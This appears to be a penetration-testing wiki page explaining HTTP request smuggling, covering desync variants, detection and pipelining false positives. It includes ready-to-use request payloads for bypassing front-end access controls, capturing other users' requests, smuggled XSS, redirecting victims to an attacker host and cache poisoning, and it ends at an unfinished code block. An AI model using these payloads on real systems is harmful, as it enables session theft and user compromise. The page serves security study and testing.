_body: "# HTTP Request Smuggling / HTTP Desync Attack\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## What is\n\
  \nThis vulnerability occurs when a **desyncronization** between **front-end proxies** and the **back-end** server allows\
  \ an **attacker** to **send** an HTTP **request** that will be **interpreted** as a **single request** by the **front-end**\
  \ proxies (load balance/reverse-proxy) and **as 2 request** by the **back-end** server.\\\nThis allows a user to **modify\
  \ the next request that arrives to the back-end server after his**.\n\n### Theory\n\n[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)\n\
  \n> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST\
  \ be ignored.\n\n**Content-Length**\n\n> The Content-Length entity header indicates the size of the entity-body, in bytes,\
  \ sent to the recipient.\n\n**Transfer-Encoding: chunked**\n\n> The Transfer-Encoding header specifies the form of encoding\
  \ used to safely transfer the payload body to the user.\\\n> Chunked means that large data is sent in a series of chunks\n\
  \n### Reality\n\nThe **Front-End** (a load-balance / Reverse Proxy) **process** the _**content-length**_ or the _**transfer-encoding**_\
  \ header and the **Back-end** server **process the other** one provoking a **desyncronization** between the 2 systems.\\\
  \nThis could be very critical as **an attacker will be able to send one request** to the reverse proxy that will be **interpreted**\
  \ by the **back-end** server **as 2 different requests**. The **danger** of this technique resides in the fact the **back-end**\
  \ server **will interpret** the **2nd request injected** as if it **came from the next client** and the **real request**\
  \ of that client will be **part** of the **injected request**.\n\n### Particularities\n\nRemember that in HTTP **a new line\
  \ character is composed by 2 bytes:**\n\n- **Content-Length**: This header uses a **decimal number** to indicate the **number**\
  \ of **bytes** of the **body** of the request. The body is expected to end in the last character, **a new line is not needed\
  \ in the end of the request**.\n- **Transfer-Encoding:** This header uses in the **body** an **hexadecimal number** to indicate\
  \ the **number** of **bytes** of the **next chunk**. The **chunk** must **end** with a **new line** but this new line **isn't\
  \ counted** by the length indicator. This transfer method must end with a **chunk of size 0 followed by 2 new lines**: `0`\n\
  - **Connection**: Based on my experience it's recommended to use **`Connection: keep-alive`** on the first request of the\
  \ request Smuggling.\n\n### Visible - Hidden\n\nThe main proble with http/1.1 is that all the requests go in the same TCP\
  \ socket, so if a discrpancy is found between 2 systems receiving requests it's possible to send one request that will be\
  \ reated as 2 different requests (or more) by the final backend (or even intermediary systems).\n\n**[This blog post](https://portswigger.net/research/http1-must-die)**\
  \ proposes new ways to detect desync attacks to a system that won't be flagged by WAFs. For this it presents the Visible\
  \ vs Hidden behaviours. The goal in this case is to try to find discrepancies in the repsonse using techniques that could\
  \ be causing desyncs withuot actually exploiting anything.\n\nFor example, sending a request with the normal host header\
  \ and a \" host\" header, if the backend complains about this request (maybe becasue the value of \" host\" is incorrect)\
  \ it possible means that the front-end didn't see about the \" host\" header while the final backend did use it, higly probale\
  \ implaying a desync between front-end and backend.\n\nThis would be a **Hidden-Visible discrepancy**.\n\nIf the front-end\
  \ would have taken into account the \" host\" header but the front-end didn't, this could have been a **Visible-Hidden**\
  \ situation.\n\nFor example, this allowed to discover desyncs between AWS ALB as front-end and IIS as the backend. This\
  \ was because when the \"Host: foo/bar\" was sent, the ALB returned `400, Server; awselb/2.0`, but when \"Host : foo/bar\"\
  \ was sent, it returned `400, Server: Microsoft-HTTPAPI/2.0`, indicating the backend was sending the response. This is a\
  \ Hidden-Vissible (H-V) situation.\n\nNote that this situation is not corrected in the AWS, but it can be prevented setting\
  \ `routing.http.drop_invalid_header_fields.enabled` and `routing.http.desync_mitigation_mode = strictest`.\n\n\n## Basic\
  \ Examples\n\n> [!TIP]\n> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1\
  \ line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.\n\
  \nHTTP request smuggling attacks are crafted by sending ambiguous requests that exploit discrepancies in how front-end and\
  \ back-end servers interpret the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. These attacks can manifest\
  \ in different forms, primarily as **CL.TE**, **TE.CL**, and **TE.TE**. Each type represents a unique combination of how\
  \ the front-end and back-end servers prioritize these headers. The vulnerabilities arise from the servers processing the\
  \ same request in different ways, leading to unexpected and potentially malicious outcomes.\n\n### Basic Examples of Vulnerability\
  \ Types\n\n![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)\n\
  \n> [!TIP]\n> To the previous table you should add the TE.0 technique, like CL.0 technique but using Transfer Encoding.\n\
  \n#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)\n\n- **Front-End (CL):**\
  \ Processes the request based on the `Content-Length` header.\n- **Back-End (TE):** Processes the request based on the `Transfer-Encoding`\
  \ header.\n- **Attack Scenario:**\n\n  - The attacker sends a request where the `Content-Length` header's value does not\
  \ match the actual content length.\n  - The front-end server forwards the entire request to the back-end, based on the `Content-Length`\
  \ value.\n  - The back-end server processes the request as chunked due to the `Transfer-Encoding: chunked` header, interpreting\
  \ the remaining data as a separate, subsequent request.\n  - **Example:**\n\n    ```\n    POST / HTTP/1.1\n    Host: vulnerable-website.com\n\
  \    Content-Length: 30\n    Connection: keep-alive\n    Transfer-Encoding: chunked\n\n    0\n\n    GET /404 HTTP/1.1\n\
  \    Foo: x\n    ```\n\n#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)\n\
  \n- **Front-End (TE):** Processes the request based on the `Transfer-Encoding` header.\n- **Back-End (CL):** Processes the\
  \ request based on the `Content-Length` header.\n- **Attack Scenario:**\n\n  - The attacker sends a chunked request where\
  \ the chunk size (`7b`) and actual content length (`Content-Length: 4`) do not align.\n  - The front-end server, honoring\
  \ `Transfer-Encoding`, forwards the entire request to the back-end.\n  - The back-end server, respecting `Content-Length`,\
  \ processes only the initial part of the request (`7b` bytes), leaving the rest as part of an unintended subsequent request.\n\
  \  - **Example:**\n\n    ```\n    POST / HTTP/1.1\n    Host: vulnerable-website.com\n    Content-Length: 4\n    Connection:\
  \ keep-alive\n    Transfer-Encoding: chunked\n\n    7b\n    GET /404 HTTP/1.1\n    Host: vulnerable-website.com\n    Content-Type:\
  \ application/x-www-form-urlencoded\n    Content-Length: 30\n\n    x=\n    0\n\n    ```\n\n#### TE.TE Vulnerability (Transfer-Encoding\
  \ used by both, with obfuscation)\n\n- **Servers:** Both support `Transfer-Encoding`, but one can be tricked into ignoring\
  \ it via obfuscation.\n- **Attack Scenario:**\n\n  - The attacker sends a request with obfuscated `Transfer-Encoding` headers.\n\
  \  - Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL vulnerability\
  \ may be exploited.\n  - The unprocessed part of the request, as seen by one of the servers, becomes part of a subsequent\
  \ request, leading to smuggling.\n  - **Example:**\n\n    ```\n    POST / HTTP/1.1\n    Host: vulnerable-website.com\n \
  \   Transfer-Encoding: xchunked\n    Transfer-Encoding : chunked\n    Transfer-Encoding: chunked\n    Transfer-Encoding:\
  \ x\n    Transfer-Encoding: chunked\n    Transfer-Encoding: x\n    Transfer-Encoding:[tab]chunked\n    [space]Transfer-Encoding:\
  \ chunked\n    X: X[\\n]Transfer-Encoding: chunked\n\n    Transfer-Encoding\n    : chunked\n    ```\n\n#### **CL.CL Scenario\
  \ (Content-Length used by both Front-End and Back-End)**\n\n- Both servers process the request based solely on the `Content-Length`\
  \ header.\n- This scenario typically does not lead to smuggling, as there's alignment in how both servers interpret the\
  \ request length.\n- **Example:**\n\n  ```\n  POST / HTTP/1.1\n  Host: vulnerable-website.com\n  Content-Length: 16\n  Connection:\
  \ keep-alive\n\n  Normal Request\n  ```\n\n#### **CL.0 Scenario**\n\n- Refers to scenarios where the `Content-Length` header\
  \ is present and has a value other than zero, indicating that the request body has content. The back-end ignores the `Content-Length`\
  \ header (which is treated as 0), but the front-end parses it.\n- It's crucial in understanding and crafting smuggling attacks,\
  \ as it influences how servers determine the end of a request.\n- **Example:**\n\n  ```\n  POST / HTTP/1.1\n  Host: vulnerable-website.com\n\
  \  Content-Length: 16\n  Connection: keep-alive\n\n  Non-Empty Body\n  ```\n\n#### TE.0 Scenario\n\n- Like the previous\
  \ one but using TE\n- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)\n\
  - **Example**:\n\n```\nOPTIONS / HTTP/1.1\nHost: {HOST}\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language:\
  \ en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122\
  \ Safari/537.36\nTransfer-Encoding: chunked\nConnection: keep-alive\n\n50\nGET <http://our-collaborator-server/> HTTP/1.1\n\
  x: X\n0\nEMPTY_LINE_HERE\nEMPTY_LINE_HERE\n```\n\n#### `0.CL` Scenario\n\nIn a `0.CL` sitation a request is send with a\
  \ Content-Length like:\n\n```\nGET /Logon HTTP/1.1\nHost: <redacted>\nContent-Length:\n 7\n\nGET /404 HTTP/1.1\nX: Y\n```\n\
  \nAnd the front-end doesn't take the `Content-Length` into account so it only sends the first request to the backend (until\
  \ the 7 in the example). However, the backend sees the `Content-Length` and waits for a body that never arrives cause the\
  \ front-end is already waiting for the response.\n\nHowever, if there is a request that it's possible to send to the backend\
  \ that is responded before receiving the body of the request, this deadlock won't occure. In IIS for example this happen\
  \ sending requests to forbidden words like `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)),\
  \ this way, the initial request will be responded directly and the second requets will contain the request of the victim\
  \ like:\n\n```\nGET / HTTP/1.1\nX: yGET /victim HTTP/1.1\nHost: <redacted>\n```\n\nThis is useful to cause a desync, but\
  \ it won't have any impact until now.\n\nHowever, the post offers a solution for this by converting a **[0.CL attack into\
  \ a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.\n\n#### Breaking the web server\n\nThis\
  \ technique is also useful in scenarios where it's possible to **break a web server while reading the initial HTTP data**\
  \ but **without closing the connection**. This way, the **body** of the HTTP request will be considered the **next HTTP\
  \ request**.\n\nFor example, as explained in [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug it was\
  \ possible to send some **Unicode** characters and it will make the server **break**. However, if the HTTP connection was\
  \ created with the header **`Connection: keep-alive`**, the body of the request won’t be read and the connection will still\
  \ be open, so the **body** of the request will be treated as the **next HTTP request**.\n\n#### Forcing via hop-by-hop headers\n\
  \nAbusing hop-by-hop headers you could indicate the proxy to **delete the header Content-Length or Transfer-Encoding so\
  \ a HTTP request smuggling is possible to abuse**.\n\n```\nConnection: Content-Length\n```\n\nFor **more information about\
  \ hop-by-hop headers** visit:\n\n\n{{#ref}}\n../abusing-hop-by-hop-headers.md\n{{#endref}}\n\n## Finding HTTP Request Smuggling\n\
  \nIdentifying HTTP request smuggling vulnerabilities can often be achieved using timing techniques, which rely on observing\
  \ how long it takes for the server to respond to manipulated requests. These techniques are particularly useful for detecting\
  \ CL.TE and TE.CL vulnerabilities. Besides these methods, there are other strategies and tools that can be used to find\
  \ such vulnerabilities:\n\n### Finding CL.TE Vulnerabilities Using Timing Techniques\n\n- **Method:**\n\n  - Send a request\
  \ that, if the application is vulnerable, will cause the back-end server to wait for additional data.\n  - **Example:**\n\
  \n    ```\n    POST / HTTP/1.1\n    Host: vulnerable-website.com\n    Transfer-Encoding: chunked\n    Connection: keep-alive\n\
  \    Content-Length: 4\n\n    1\n    A\n    0\n    ```\n\n  - **Observation:**\n    - The front-end server processes the\
  \ request based on `Content-Length` and cuts off the message prematurely.\n    - The back-end server, expecting a chunked\
  \ message, waits for the next chunk that never arrives, causing a delay.\n\n- **Indicators:**\n  - Timeouts or long delays\
  \ in response.\n  - Receiving a 400 Bad Request error from the back-end server, sometimes with detailed server information.\n\
  \n### Finding TE.CL Vulnerabilities Using Timing Techniques\n\n- **Method:**\n\n  - Send a request that, if the application\
  \ is vulnerable, will cause the back-end server to wait for additional data.\n  - **Example:**\n\n    ```\n    POST / HTTP/1.1\n\
  \    Host: vulnerable-website.com\n    Transfer-Encoding: chunked\n    Connection: keep-alive\n    Content-Length: 6\n\n\
  \    0\n    X\n    ```\n\n  - **Observation:**\n    - The front-end server processes the request based on `Transfer-Encoding`\
  \ and forwards the entire message.\n    - The back-end server, expecting a message based on `Content-Length`, waits for\
  \ additional data that never arrives, causing a delay.\n\n### Other Methods to Find Vulnerabilities\n\n- **Differential\
  \ Response Analysis:**\n  - Send slightly varied versions of a request and observe if the server responses differ in an\
  \ unexpected way, indicating a parsing discrepancy.\n- **Using Automated Tools:**\n  - Tools like Burp Suite's 'HTTP Request\
  \ Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and\
  \ analyzing the responses.\n- **Content-Length Variance Tests:**\n  - Send requests with varying `Content-Length` values\
  \ that are not aligned with the actual content length and observe how the server handles such mismatches.\n- **Transfer-Encoding\
  \ Variance Tests:**\n  - Send requests with obfuscated or malformed `Transfer-Encoding` headers and monitor how differently\
  \ the front-end and back-end servers respond to such manipulations.\n\n### The `Expect: 100-continue` header\n\nCheck how\
  \ this header can help exploiting a http desync in:\n\n{{#ref}}\n../../network-services-pentesting/pentesting-web/special-http-headers.md\n\
  {{#endref}}\n\n### HTTP Request Smuggling Vulnerability Testing\n\nAfter confirming the effectiveness of timing techniques,\
  \ it's crucial to verify if client requests can be manipulated. A straightforward method is to attempt poisoning your requests,\
  \ for instance, making a request to `/` yield a 404 response. The `CL.TE` and `TE.CL` examples previously discussed in [Basic\
  \ Examples](#basic-examples) demonstrate how to poison a client's request to elicit a 404 response, despite the client aiming\
  \ to access a different resource.\n\n**Key Considerations**\n\nWhen testing for request smuggling vulnerabilities by interfering\
  \ with other requests, bear in mind:\n\n- **Distinct Network Connections:** The \"attack\" and \"normal\" requests should\
  \ be dispatched over separate network connections. Utilizing the same connection for both doesn't validate the vulnerability's\
  \ presence.\n- **Consistent URL and Parameters:** Aim to use identical URLs and parameter names for both requests. Modern\
  \ applications often route requests to specific back-end servers based on URL and parameters. Matching these increases the\
  \ likelihood that both requests are processed by the same server, a prerequisite for a successful attack.\n- **Timing and\
  \ Racing Conditions:** The \"normal\" request, meant to detect interference from the \"attack\" request, competes against\
  \ other concurrent application requests. Therefore, send the \"normal\" request immediately following the \"attack\" request.\
  \ Busy applications may necessitate multiple trials for conclusive vulnerability confirmation.\n- **Load Balancing Challenges:**\
  \ Front-end servers acting as load balancers may distribute requests across various back-end systems. If the \"attack\"\
  \ and \"normal\" requests end up on different systems, the attack won't succeed. This load balancing aspect may require\
  \ several attempts to confirm a vulnerability.\n- **Unintended User Impact:** If your attack inadvertently impacts another\
  \ user's request (not the \"normal\" request you sent for detection), this indicates your attack influenced another application\
  \ user. Continuous testing could disrupt other users, mandating a cautious approach.\n\n## Distinguishing HTTP/1.1 pipelining\
  \ artifacts vs genuine request smuggling\n\nConnection reuse (keep-alive) and pipelining can easily produce illusions of\
  \ \"smuggling\" in testing tools that send multiple requests on the same socket. Learn to separate harmless client-side\
  \ artifacts from real server-side desync.\n\n### Why pipelining creates classic false positives\n\nHTTP/1.1 reuses a single\
  \ TCP/TLS connection and concatenates requests and responses on the same stream. In pipelining, the client sends multiple\
  \ requests back-to-back and relies on in-order responses. A common false-positive is to resend a malformed CL.0-style payload\
  \ twice on a single connection:\n\n```\nPOST / HTTP/1.1\nHost: hackxor.net\nContent_Length: 47\n\nGET /robots.txt HTTP/1.1\n\
  X: Y\n```\n\nResponses may look like:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n```\n```\nHTTP/1.1 200 OK\nContent-Type:\
  \ text/plain\n\nUser-agent: *\nDisallow: /settings\n```\n\nIf the server ignored the malformed `Content_Length`, there is\
  \ no FE↔BE desync. With reuse, your client actually sent this byte-stream, which the server parsed as two independent requests:\n\
  \n```\nPOST / HTTP/1.1\nHost: hackxor.net\nContent_Length: 47\n\nGET /robots.txt HTTP/1.1\nX: YPOST / HTTP/1.1\nHost: hackxor.net\n\
  Content_Length: 47\n\nGET /robots.txt HTTP/1.1\nX: Y\n```\n\nImpact: none. You just desynced your client from the server\
  \ framing.\n\n> [!TIP]\n> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder\
  \ with \"HTTP/1 connection reuse\", Repeater \"Send group in sequence (single connection)\" or \"Enable connection reuse\"\
  .\n\n### Litmus tests: pipelining or real desync?\n\n1. Disable reuse and re-test\n   - In Burp Intruder/Repeater, turn\
  \ off HTTP/1 reuse and avoid \"Send group in sequence\".\n   - In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.\n\
  \   - If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful\
  \ targets or client-side desync.\n2. HTTP/2 nested-response check\n   - Send an HTTP/2 request. If the response body contains\
  \ a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.\n3. Partial-requests\
  \ probe for connection-locked front-ends\n   - Some FEs only reuse the upstream BE connection if the client reused theirs.\
  \ Use partial-requests to detect FE behavior that mirrors client reuse.\n   - See PortSwigger \"Browser‑Powered Desync Attacks\"\
  \ for the connection-locked technique.\n4. State probes\n   - Look for first- vs subsequent-request differences on the same\
  \ TCP connection (first-request routing/validation).\n   - Burp \"HTTP Request Smuggler\" includes a connection‑state probe\
  \ that automates this.\n5. Visualize the wire\n   - Use the Burp \"HTTP Hacker\" extension to inspect concatenation and\
  \ message framing directly while experimenting with reuse and partial requests.\n\n### Connection‑locked request smuggling\
  \ (reuse-required)\n\nSome front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists\
  \ but is conditional on client-side reuse. To distinguish and prove impact:\n- Prove the server-side bug\n  - Use the HTTP/2\
  \ nested-response check, or\n  - Use partial-requests to show the FE only reuses upstream when the client does.\n- Show\
  \ real impact even if direct cross-user socket abuse is blocked:\n  - Cache poisoning: poison shared caches via the desync\
  \ so responses affect other users.\n  - Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers)\
  \ and pivot to auth bypass.\n  - Bypass FE controls: smuggle restricted paths/methods past the front-end.\n  - Host-header\
  \ abuse: combine with host routing quirks to pivot to internal vhosts.\n- Operator workflow\n  - Reproduce with controlled\
  \ reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → \"Send group in sequence (single connection)\"\
  ).\n  - Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.\n\n\
  > See also connection‑state attacks, which are closely related but not technically smuggling:\n>\n>{{#ref}}\n>../http-connection-request-smuggling.md\n\
  >{{#endref}}\n\n### Client‑side desync constraints\n\nIf you’re targeting browser-powered/client-side desync, the malicious\
  \ request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable\
  \ via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream\
  \ components reflect or cache responses.\n\nFor background and end-to-end workflows:\n\n{{#ref}}\nbrowser-http-request-smuggling.md\n\
  {{#endref}}\n\n### Tooling to help decide\n\n- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket\
  \ concatenation.\n- \"Smuggling or pipelining?\" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda\n\
  - Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.\n- Burp HTTP Request Smuggler: includes\
  \ a connection‑state probe to spot first‑request routing/validation.\n\n> [!NOTE]\n> Treat reuse-only effects as non-issues\
  \ unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling\
  \ privilege bypass, bypassed FE control, etc.).\n\n## Abusing HTTP Request Smuggling\n\n### Circumventing Front-End Security\
  \ via HTTP Request Smuggling\n\nSometimes, front-end proxies enforce security measures, scrutinizing incoming requests.\
  \ However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted\
  \ endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking\
  \ such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving\
  \ a loophole for bypassing these restrictions.\n\nConsider the following examples illustrating how HTTP Request Smuggling\
  \ can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded\
  \ by the front-end proxy:\n\n**CL.TE Example**\n\n```\nPOST / HTTP/1.1\nHost: [redacted].web-security-academy.net\nCookie:\
  \ session=[redacted]\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\nTransfer-Encoding:\
  \ chunked\n\n0\nGET /admin HTTP/1.1\nHost: localhost\nContent-Length: 10\n\nx=\n```\n\nIn the CL.TE attack, the `Content-Length`\
  \ header is leveraged for the initial request, while the subsequent embedded request utilizes the `Transfer-Encoding: chunked`\
  \ header. The front-end proxy processes the initial `POST` request but fails to inspect the embedded `GET /admin` request,\
  \ allowing unauthorized access to the `/admin` path.\n\n**TE.CL Example**\n\n```\nPOST / HTTP/1.1\nHost: [redacted].web-security-academy.net\n\
  Cookie: session=[redacted]\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\nContent-Length: 4\n\
  Transfer-Encoding: chunked\n2b\nGET /admin HTTP/1.1\nHost: localhost\na=x\n0\n\n```\n\nConversely, in the TE.CL attack,\
  \ the initial `POST` request uses `Transfer-Encoding: chunked`, and the subsequent embedded request is processed based on\
  \ the `Content-Length` header. Similar to the CL.TE attack, the front-end proxy overlooks the smuggled `GET /admin` request,\
  \ inadvertently granting access to the restricted `/admin` path.\n\n### Revealing front-end request rewriting <a href=\"\
  #revealing-front-end-request-rewriting\" id=\"revealing-front-end-request-rewriting\"></a>\n\nApplications often employ\
  \ a **front-end server** to modify incoming requests before passing them to the back-end server. A typical modification\
  \ involves adding headers, such as `X-Forwarded-For: <IP of the client>`, to relay the client's IP to the back-end. Understanding\
  \ these modifications can be crucial, as it might reveal ways to **bypass protections** or **uncover concealed information\
  \ or endpoints**.\n\nTo investigate how a proxy alters a request, locate a POST parameter that the back-end echoes in the\
  \ response. Then, craft a request, using this parameter last, similar to the following:\n\n```\nPOST / HTTP/1.1\nHost: vulnerable-website.com\n\
  Content-Length: 130\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n0\n\nPOST /search HTTP/1.1\nHost: vulnerable-website.com\n\
  Content-Type: application/x-www-form-urlencoded\nContent-Length: 100\n\nsearch=\n```\n\nIn this structure, subsequent request\
  \ components are appended after `search=`, which is the parameter reflected in the response. This reflection will expose\
  \ the headers of the subsequent request.\n\nIt's important to align the `Content-Length` header of the nested request with\
  \ the actual content length. Starting with a small value and incrementing gradually is advisable, as too low a value will\
  \ truncate the reflected data, while too high a value can cause the request to error out.\n\nThis technique is also applicable\
  \ in the context of a TE.CL vulnerability, but the request should terminate with `search=\\r\\n0`. Regardless of the newline\
  \ characters, the values will append to the search parameter.\n\nThis method primarily serves to understand the request\
  \ modifications made by the front-end proxy, essentially performing a self-directed investigation.\n\n### Capturing other\
  \ users' requests <a href=\"#capturing-other-users-requests\" id=\"capturing-other-users-requests\"></a>\n\nIt's feasible\
  \ to capture the requests of the next user by appending a specific request as the value of a parameter during a POST operation.\
  \ Here's how this can be accomplished:\n\nBy appending the following request as the value of a parameter, you can store\
  \ the subsequent client's request:\n\n```\nPOST / HTTP/1.1\nHost: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net\n\
  Content-Type: application/x-www-form-urlencoded\nContent-Length: 319\nConnection: keep-alive\nCookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi\n\
  Transfer-Encoding: chunked\n\n0\n\nPOST /post/comment HTTP/1.1\nHost: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net\n\
  Content-Length: 659\nContent-Type: application/x-www-form-urlencoded\nCookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi\n\
  \ncsrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=\n```\n\nIn this scenario,\
  \ the **comment parameter** is intended to store the contents within a post's comment section on a publicly accessible page.\
  \ Consequently, the subsequent request's contents will appear as a comment.\n\nHowever, this technique has limitations.\
  \ Generally, it captures data only up to the parameter delimiter used in the smuggled request. For URL-encoded form submissions,\
  \ this delimiter is the `&` character. This means the captured content from the victim user's request will stop at the first\
  \ `&`, which may even be part of the query string.\n\nAdditionally, it's worth noting that this approach is also viable\
  \ with a TE.CL vulnerability. In such cases, the request should conclude with `search=\\r\\n0`. Regardless of newline characters,\
  \ the values will be appended to the search parameter.\n\n### Using HTTP request smuggling to exploit reflected XSS\n\n\
  HTTP Request Smuggling can be leveraged to exploit web pages vulnerable to **Reflected XSS**, offering significant advantages:\n\
  \n- Interaction with the target users is **not required**.\n- Allows the exploitation of XSS in parts of the request that\
  \ are **normally unattainable**, like HTTP request headers.\n\nIn scenarios where a website is susceptible to Reflected\
  \ XSS through the User-Agent header, the following payload demonstrates how to exploit this vulnerability:\n\n```\nPOST\
  \ / HTTP/1.1\nHost: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
  \ Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0\nCookie: session=ac311fa41f0aa1e880b0594d008d009e\nTransfer-Encoding:\
  \ chunked\nConnection: keep-alive\nContent-Length: 213\nContent-Type: application/x-www-form-urlencoded\n\n0\n\nGET /post?postId=2\
  \ HTTP/1.1\nHost: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net\nUser-Agent: \"><script>alert(1)</script>\n\
  Content-Length: 10\nContent-Type: application/x-www-form-urlencoded\n\nA=\n```\n\nThis payload is structured to exploit\
  \ the vulnerability by:\n\n1. Initiating a `POST` request, seemingly typical, with a `Transfer-Encoding: chunked` header\
  \ to indicate the start of smuggling.\n2. Following with a `0`, marking the end of the chunked message body.\n3. Then, a\
  \ smuggled `GET` request is introduced, where the `User-Agent` header is injected with a script, `<script>alert(1)</script>`,\
  \ triggering the XSS when the server processes this subsequent request.\n\nBy manipulating the `User-Agent` through smuggling,\
  \ the payload bypasses normal request constraints, thus exploiting the Reflected XSS vulnerability in a non-standard but\
  \ effective manner.\n\n#### HTTP/0.9\n\n> [!CAUTION]\n> In case the user content is reflected in a response with a **`Content-type`**\
  \ such as **`text/plain`**, preventing the execution of the XSS. If the server support **HTTP/0.9 it might be possible to\
  \ bypass this**!\n\nThe version HTTP/0.9 was previously to the 1.0 and only uses **GET** verbs and **doesn’t** respond with\
  \ **headers**, just the body.\n\nIn [**this writeup**](https://mizu.re/post/twisty-python), this was abused with a request\
  \ smuggling and a **vulnerable endpoint that will reply with the input of the user** to smuggle a request with HTTP/0.9.\
  \ The parameter that will be reflected in the response contained a **fake HTTP/1.1 response (with headers and body)** so\
  \ the response will contain valid executable JS code with a `Content-Type` of `text/html`.\n\n### Exploiting On-site Redirects\
  \ with HTTP Request Smuggling <a href=\"#exploiting-on-site-redirects-with-http-request-smuggling\" id=\"exploiting-on-site-redirects-with-http-request-smuggling\"\
  ></a>\n\nApplications often redirect from one URL to another by using the hostname from the `Host` header in the redirect\
  \ URL. This is common with web servers like Apache and IIS. For instance, requesting a folder without a trailing slash results\
  \ in a redirect to include the slash:\n\n```\nGET /home HTTP/1.1\nHost: normal-website.com\n```\n\nResults in:\n\n```\n\
  HTTP/1.1 301 Moved Permanently\nLocation: https://normal-website.com/home/\n```\n\nThough seemingly harmless, this behavior\
  \ can be manipulated using HTTP request smuggling to redirect users to an external site. For example:\n\n```\nPOST / HTTP/1.1\n\
  Host: vulnerable-website.com\nContent-Length: 54\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n0\n\nGET /home HTTP/1.1\n\
  Host: attacker-website.com\nFoo: X\n```\n\nThis smuggled request could cause the next processed user request to be redirected\
  \ to an attacker-controlled website:\n\n```\nGET /home HTTP/1.1\nHost: attacker-website.com\nFoo: XGET /scripts/include.js\
  \ HTTP/1.1\nHost: vulnerable-website.com\n```\n\nResults in:\n\n```\nHTTP/1.1 301 Moved Permanently\nLocation: https://attacker-website.com/home/\n\
  ```\n\nIn this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the\
  \ user by serving malicious JavaScript in response.\n\n### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a\
  \ href=\"#exploiting-web-cache-poisoning-via-http-request-smuggling\" id=\"exploiting-web-cache-poisoning-via-http-request-smuggling\"\
  ></a>\n\nWeb cache poisoning can be executed if any component of the **front-end infrastructure caches content**, typically\
  \ to enhance performance. By manipulating the server's response, it's possible to **poison the cache**.\n\nPreviously, we\
  \ observed how server responses could be altered to return a 404 error (refer to [Basic Examples](#basic-examples)). Similarly,\
  \ it’s feasible to trick the server into delivering `/index.html` content in response to a request for `/static/include.js`.\
  \ Consequently, the `/static/include.js` content gets replaced in the cache with that of `/index.html`, rendering `/static/include.js`\
  \ inaccessible to users, potentially leading to a Denial of Service (DoS).\n\nThis technique becomes particularly potent\
  \ if an **Open Redirect vulnerability** is discovered or if there's an **on-site redirect to an open redirect**. Such vulnerabilities\
  \ can be exploited to replace the cached content of `/static/include.js` with a script under the attacker's control, essentially\
  \ enabling a widespread Cross-Site Scripting (XSS) attack against all clients requesting the updated `/static/include.js`.\n\
  \nBelow is an illustration of exploiting **cache poisoning combined with an on-site redirect to open redirect**. The objective\
  \ is to alter the cache content of `/static/include.js` to serve JavaScript code controlled by the attacker:\n\n```\nPOST\
